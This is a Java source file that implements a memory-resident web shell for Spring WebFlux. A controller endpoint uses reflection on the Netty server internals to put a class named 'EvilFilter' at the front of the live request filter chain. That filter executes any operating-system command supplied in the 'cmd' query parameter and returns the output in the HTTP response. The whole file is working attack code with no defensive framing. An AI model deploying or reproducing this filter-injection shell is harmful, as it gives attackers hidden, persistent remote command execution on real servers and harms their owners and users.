package com.flux;

import org.springframework.boot.web.embedded.netty.NettyWebServer;
import org.springframework.core.io.buffer.DefaultDataBufferFactory;
import org.springframework.http.server.reactive.ReactorHttpHandlerAdapter;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilterChain;
import org.springframework.web.server.adapter.HttpWebHandlerAdapter;
import org.springframework.web.server.handler.DefaultWebFilterChain;
import org.springframework.web.server.handler.ExceptionHandlingWebHandler;
import org.springframework.web.server.handler.FilteringWebHandler;
import reactor.core.publisher.Mono;

import java.io.PrintStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Scanner;

@RestController
public class WebFilter {
    @RequestMapping("/webFilter")
    public String webFilter() throws Exception{
        for (Thread thread : Thread.getAllStackTraces().keySet()) {
            if (thread.getClass().getName().contains("NettyWebServer")) {
                /**
                 * org.springframework.boot.web.embedded.netty.NettyWebServer@4a9e5ba8
                 * org.springframework.http.server.reactive.ReactorHttpHandlerAdapter@364c0898
                 * org.springframework.boot.web.reactive.context.WebServerManager$DelayedInitializationHttpHandler@e3746e2
                 * HttpWebHandlerAdapter [delegate=ExceptionHandlingWebHandler [delegate=FilteringWebHandler [delegate=org.springframework.web.reactive.DispatcherHandler@55f4d1bf]]]
                 * ExceptionHandlingWebHandler [delegate=FilteringWebHandler [delegate=org.springframework.web.reactive.DispatcherHandler@55f4d1bf]]
                 * FilteringWebHandler [delegate=org.springframework.web.reactive.DispatcherHandler@55f4d1bf]
                 */
//              ==================
                NettyWebServer nettyWebServer = (NettyWebServer) Utils.getField(thread ,"this$0");
                ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) Utils.getField(nettyWebServer ,"handler");
                Object o3 = Utils.getField(reactorHttpHandlerAdapter ,"httpHandler");
                HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) Utils.getField(o3 ,"delegate");
                ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) Utils.getField(httpWebHandlerAdapter ,"delegate");
                FilteringWebHandler filteringWebHandler = (FilteringWebHandler) Utils.getField(exceptionHandlingWebHandler ,"delegate");
//              ==================
                DefaultWebFilterChain chain = (DefaultWebFilterChain) Utils.getField(filteringWebHandler ,"chain");
                ArrayList newFilters = new ArrayList(chain.getFilters());

                EvilFilter evilFilter = new EvilFilter();

                for (Object obj2 : newFilters) {
                    if (obj2.getClass().getName().equals(evilFilter.getClass().getName())) {
                        return "existed";
                    }
                }
                newFilters.add(0 ,evilFilter);
                Utils.setFinalField(filteringWebHandler ,"chain" ,new DefaultWebFilterChain(chain.getHandler(), newFilters));

            }
        }

        return "success";
    }
}
class EvilFilter implements org.springframework.web.server.WebFilter {

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        String cmd = exchange.getRequest().getQueryParams().getFirst("cmd");
        if (cmd == null || cmd.isEmpty()) {
            return chain.filter(exchange);
        }

        try {
            String result = new Scanner(Utils.execCmd(cmd)).useDelimiter("\\A").next();
            return exchange.getResponse().writeWith(Mono.just(new DefaultDataBufferFactory().wrap(result.getBytes(StandardCharsets.UTF_8))));
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}